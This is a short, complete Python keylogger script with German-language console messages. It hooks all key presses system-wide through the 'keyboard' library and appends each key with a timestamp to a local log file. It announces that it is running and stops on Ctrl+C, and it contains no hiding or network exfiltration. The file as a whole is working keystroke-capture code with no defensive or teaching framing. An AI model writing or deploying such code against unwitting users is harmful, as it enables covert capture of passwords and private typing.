import keyboard
from datetime import datetime
import uuid
import sys

log_file = open(f"keylog_{uuid.uuid4()}.txt", "a")

def on_key(event):
    try:
        key = event.name
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_file.write(f"{timestamp}: {key}\n")
        log_file.flush()
    except Exception as e:
        print(f"Fehler beim Loggen der Taste: {e}")

def exit_program():
    print("\nKeylogger wird gestoppt. Beende das Programm...")
    try:
        log_file.close()
    except Exception as e:
        print(f"Fehler beim Schließen der Log-Datei: {e}")
    sys.exit(0)

try:
    keyboard.on_press(on_key)
except Exception as e:
    print(f"Fehler beim Registrieren der Tasteneingaben: {e}")
    sys.exit(1)

def show_status():
    print("\nKeylogger läuft. Drücke Strg + C, um den Keylogger zu stoppen.")
    print("Alle gedrückten Tasten werden in einer Log-Datei gespeichert.\n")

keyboard.add_hotkey('ctrl+c', exit_program)

show_status()

keyboard.wait()
